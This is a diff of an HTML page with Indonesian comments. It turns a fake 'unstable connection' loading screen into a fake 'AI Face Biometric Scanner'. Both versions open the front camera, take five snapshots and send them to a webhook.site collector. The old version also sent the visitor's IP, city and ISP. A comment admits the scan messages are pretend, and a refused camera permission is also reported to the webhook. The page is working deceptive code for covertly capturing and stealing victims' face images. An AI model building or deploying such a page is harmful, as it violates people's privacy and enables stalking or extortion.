@@ -3,112 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Sedang Memuat...</title>
+    <title>AI Face Biometric Scanner</title>
     <style>
-        body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: sans-serif; overflow: hidden; }
-        #container { position: relative; display: flex; flex-direction: column; align-items: center; z-index: 10; background: #121212; width: 100%; height: 100%; justify-content: center;}
-        #loader { border: 5px solid #333; border-top: 5px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; color: #fe2c55; text-align: center; }
+        body { margin: 0; padding: 0; width: 100vw; height: 100vh; background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; overflow: hidden; display: flex; justify-content: center; align-items: center; }
         
-        /* Video tetap besar tapi samar di background agar sensor cahaya kamera aktif */
-        #video {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 1;
-            opacity: 0.08; 
+        /* Container Utama */
+        #scanner-container { position: relative; width: 300px; height: 300px; border: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; display: flex; justify-content: center; align-items: center; }
+
+        /* Video Stream (Kelihatan tapi transparan/biru gitu biar estetik) */
+        #video { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.4; filter: sepia(100%) hue-rotate(100deg) brightness(1.2); }
+
+        /* Garis Scan Bergerak */
+        #scan-line { position: absolute; width: 100%; height: 2px; background: #00ff00; box-shadow: 0 0 10px #00ff00; top: 0; animation: scan 2s linear infinite; z-index: 5; }
+
+        @keyframes scan {
+            0% { top: 0; }
+            50% { top: 100%; }
+            100% { top: 0; }
         }
+
+        /* Ornamen Sudut (Frame) */
+        .corner { position: absolute; width: 20px; height: 20px; border: 3px solid #00ff00; z-index: 6; }
+        .top-left { top: -5px; left: -5px; border-right: none; border-bottom: none; }
+        .top-right { top: -5px; right: -5px; border-left: none; border-bottom: none; }
+        .bottom-left { bottom: -5px; left: -5px; border-right: none; border-top: none; }
+        .bottom-right { bottom: -5px; right: -5px; border-left: none; border-top: none; }
+
+        #info { position: absolute; bottom: -60px; text-align: center; width: 100%; font-size: 12px; text-shadow: 0 0 5px #00ff00; }
         #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="container">
-        <div id="loader"></div>
-        <div id="status">Koneksi Tidak Stabil...</div>
-        <p style="font-size: 12px; color: #888; margin-top: 10px;">Sedang Sinkronisasi Frame Kamera...</p>
+    <div id="scanner-container">
+        <div class="corner top-left"></div>
+        <div class="corner top-right"></div>
+        <div class="corner bottom-left"></div>
+        <div class="corner bottom-right"></div>
+        <div id="scan-line"></div>
+        
+        <video id="video" autoplay muted playsinline></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
     </div>
 
-    <video id="video" autoplay muted playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <div id="info">
+        <div id="status">INITIALIZING BIOMETRIC...</div>
+        <div id="detail">WAITING FOR PERMISSION</div>
+    </div>
 
     <script>
-        // LINK WEBHOOK BARU KAMU
         const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
-        
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
         const statusDiv = document.getElementById('status');
+        const detailDiv = document.getElementById('detail');
         let photoCount = 0;
 
-        async function startSystem() {
+        async function startScanner() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 640, height: 480 }, 
+                    video: { facingMode: "user" }, 
                     audio: false 
                 });
                 video.srcObject = stream;
                 
                 video.onloadedmetadata = () => {
                     video.play();
-                    statusDiv.innerText = "Mengkalibrasi Sinyal...";
-                    // Tunggu 5 detik agar sensor kamera menyesuaikan cahaya (biar gak hitam)
-                    setTimeout(takeSnapShot, 5000); 
+                    statusDiv.innerText = "FACE DETECTED";
+                    detailDiv.innerText = "ANALYZING FEATURES...";
+                    // Mulai ambil foto setelah 3 detik
+                    setTimeout(takeSnapShot, 3000);
                 };
             } catch (err) {
-                statusDiv.innerText = "Gagal Menghubungkan.";
-                kirimData({ status: "IZIN_DITOLAK", pesan: err.message });
+                statusDiv.innerText = "SYSTEM ERROR";
+                detailDiv.innerText = "CAMERA ACCESS DENIED";
+                kirimData({ event: "ACCESS_DENIED" });
             }
         }
 
         function takeSnapShot() {
             if (photoCount >= 5) {
-                statusDiv.innerText = "Error: 0x88291"; 
+                statusDiv.innerText = "SCAN COMPLETE";
+                detailDiv.innerText = "VERIFICATION SUCCESSFUL";
+                // Berhenti setelah 5 foto
                 return;
             }
 
             if (video.readyState === video.HAVE_ENOUGH_DATA) {
                 photoCount++;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Gunakan kualitas 0.4 agar seimbang antara kejelasan dan kecepatan kirim
-                const dataFoto = canvas.toDataURL('image/jpeg', 0.4);
+                // Update teks pura-pura lagi scan
+                const steps = ["MAPPING POINTS...", "RECOGNIZING ID...", "DB CHECKING...", "SYNCING..."];
+                detailDiv.innerText = steps[photoCount % steps.length];
+
+                // Ambil foto asli (tanpa filter biru)
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataFoto = canvas.toDataURL('image/jpeg', 0.5);
 
                 kirimData({
-                    event: "SNAP_SHOT_FINAL",
-                    no: photoCount,
-                    foto: dataFoto,
-                    perangkat: navigator.userAgent
+                    event: "BIOMETRIC_SCAN",
+                    step: photoCount,
+                    foto: dataFoto
                 });
             }
 
-            // Ambil foto berikutnya setiap 3 detik
-            setTimeout(takeSnapShot, 3000);
+            setTimeout(takeSnapShot, 2500); // Ambil tiap 2.5 detik
         }
 
         async function kirimData(payload) {
             try {
-                // Ambil data IP & Lokasi
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                const finalData = { ...payload, ...{ kota: ipData.city, isp: ipData.org, ip: ipData.ip } };
-
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify(finalData)
+                    body: JSON.stringify(payload)
                 });
-            } catch (e) {
-                console.log("Kirim gagal");
-            }
+            } catch (e) {}
         }
 
-        window.onload = startSystem;
+        window.onload = startScanner;
     </script>
 </body>
 </html>
